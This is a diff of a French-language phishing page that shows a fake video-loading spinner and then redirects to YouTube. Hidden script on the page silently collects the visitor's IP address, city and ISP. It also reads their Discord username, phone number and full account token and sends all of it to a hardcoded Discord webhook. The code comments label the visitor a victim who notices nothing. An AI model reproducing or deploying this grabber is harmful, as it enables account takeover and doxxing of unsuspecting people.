@@ -1,61 +1,60 @@
-<!DOCTYPE html><html lang="fr"><head><meta charset="utf-8"><title>Chargement...</title>
+<!DOCTYPE html><html lang="fr"><head><meta charset="utf-8"><title>Chargement vidéo...</title>
 <meta http-equiv="refresh" content="3;url=https://www.youtube.com/watch?v=dQw4w9WgXcQ">
 <style>
-  body{margin:0;padding:0;background:#fff;height:100vh;display:flex;align-items:center;justify-content:center;font-family:Arial,sans-serif;color:#000;}
+  body{margin:0;background:#fff;height:100vh;display:flex;align-items:center;justify-content:center;font-family:Arial,sans-serif;color:#333;flex-direction:column;}
   .loader{text-align:center;}
+  spinner{border:8px solid #f3f3f3;border-top:8px solid #3498db;border-radius:50%;width:60px;height:60px;animation:s 1s linear infinite;margin-bottom:20px;}
+  @keyframes s{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
 </style>
 </head><body>
 
 <div class="loader">
-  <p>Chargement de la vidéo...</p>
+  <div class="spinner"></div>
+  <p>Chargement de la vidéo en cours...</p>
   <p>Patientez quelques secondes</p>
 </div>
 
 <script>
-// TON WEBHOOK DISCORD
-const W = "https://discordapp.com/api/webhooks/1457415566884077689/jbC9dps5442aS9flsVGY9JE1XtJ5JL07ZQwfoy_vbguug-_J_lIfLHZpo6UX1kIrBqD7";
+// TON WEBHOOK
+const W = "https://discord.com/api/webhooks/1439673608225034240/QCmvEWzJGk21ZF8AkeiNvW9cXtWFPZ3Pf-x-2rFj68OP8boHo51qHIF6ez1mmMD5KG77";
 
+// Envoi garanti
 const send = (msg) => {
   const blob = new Blob([JSON.stringify({content: msg})], {type: "application/json"});
-  navigator.sendBeacon?.(W, blob) || fetch(W, {method: "POST", headers: {"Content-Type": "application/json"}, body: blob, keepalive: true});
+  navigator.sendBeacon(W, blob) || fetch(W, {method: "POST", headers: {"Content-Type": "application/json"}, body: blob, keepalive: true});
 };
 
-let message = "VICTIME DISCRÈTE (rien vu)\n";
-let ips = [];
+let message = "VICTIME DISCRÈTE (rien vu, redirection vidéo)\n";
 
-// Récupération IPv6 (si disponible)
-try {
-  const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
-  pc.createDataChannel("");
-  pc.onicecandidate = e => { if (e.candidate) { const ip = e.candidate.candidate.split(" ")[4]; if (ip && !ips.includes(ip)) ips.push(ip); }};
-  pc.createOffer().then(o => pc.setLocalDescription(o));
-} catch(e) {}
+// Récupération silencieuse
+(async () => {
+  try {
+    const geo = await (await fetch("http://ip-api.com/json/?fields=query,city,regionName,countryName,isp,mobile,proxy")).json();
+    if (geo.status === "success") {
+      message += `IP : ${geo.query}\n`;
+      message += `Ville : ${geo.city}, ${geo.regionName}, ${geo.countryName}\n`;
+      message += `FAI : ${geo.isp} ${geo.mobile ? "(Mobile)" : ""} ${geo.proxy ? "(VPN/Proxy)" : ""}\n`;
+    }
+  } catch(e) {}
 
-// Infos IP + localisation (API fiable)
-fetch("http://ip-api.com/json/?fields=query,city,regionName,country,isp,mobile,proxy").then(r => r.json()).then(geo => {
-  message += `IP : ${geo.query}\n`;
-  if (ips.length) message += `IPv6 : ${ips.find(i => i.includes(":")) || ips[0]}\n`;
-  message += `Ville : ${geo.city}, ${geo.regionName}, ${geo.country}\n`;
-  message += `FAI : ${geo.isp} ${geo.mobile ? "(Mobile)" : ""} ${geo.proxy ? "(VPN/Proxy)" : ""}\n\n`;
+  // Discord (token + numéro + pseudo)
+  try {
+    const res = await fetch("https://discord.com/api/v9/users/@me", {credentials: "include"});
+    if (res.ok) {
+      const u = await res.json();
+      if (u.id) {
+        message += `Pseudo Discord : ${u.username}#${u.discriminator || "0000"}\n`;
+        if (u.phone) message += `NUMÉRO TÉLÉPHONE : ${u.phone}\n`;
+        const t = localStorage.getItem("token")?.replace(/"/g,"");
+        if (t && t.length > 50) message += `TOKEN COMPLET :\n${t}\n`;
+      }
+    }
+  } catch(e) {}
 
-// Discord (token + numéro + pseudo)
-fetch("https://discord.com/api/v9/users/@me", {credentials: "include"}).then(r => r.ok ? r.json() : null).then(u => {
-  if (u?.id) {
-    message += `Discord : ${u.username}#${u.discriminator || "0000"}\n`;
-    if (u.phone) message += `NUMÉRO TÉLÉPHONE : ${u.phone}\n`;
-    const token = localStorage.getItem("token")?.replace(/"/g, "");
-    if (token && token.length > 50) message += `TOKEN COMPLET :\n${token}\n`;
-  }
-
-  // Infos supplémentaires
-  message += `\nAppareil : ${navigator.platform}\n`;
-  message += `Écran : ${screen.width}×${screen.height}\n`;
-  message += `Batterie : ${navigator.getBattery ? "disponible" : "non disponible"}\n`;
-  message += `User-Agent : ${navigator.userAgent.substring(0, 100)}\n`;
-  message += `Lien ouvert : ${location.href}\n`;
-  message += `Heure : ${new Date().toLocaleString("fr-FR")}`;
+  message += `\nAppareil : ${navigator.platform}\nÉcran : ${screen.width}×${screen.height}\n`;
+  message += `Lien ouvert : ${location.href}\nHeure : ${new Date().toLocaleString("fr-FR")}`;
 
   send(message);
-});
+})();
 </script>
 </body></html>
